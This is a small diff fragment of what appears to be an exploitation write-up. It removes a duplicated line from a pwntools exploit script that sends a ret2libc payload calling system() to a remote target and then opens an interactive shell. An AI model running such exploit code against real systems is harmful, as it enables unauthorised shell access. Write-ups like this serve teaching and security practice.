@@ -209,8 +209,6 @@ payload += p64(system_libc)
 target.sendline(payload)
 
 target.interactive()
-
-target.interactive()
 ```
 And here is what it looks like when run against the remote target:
 ```
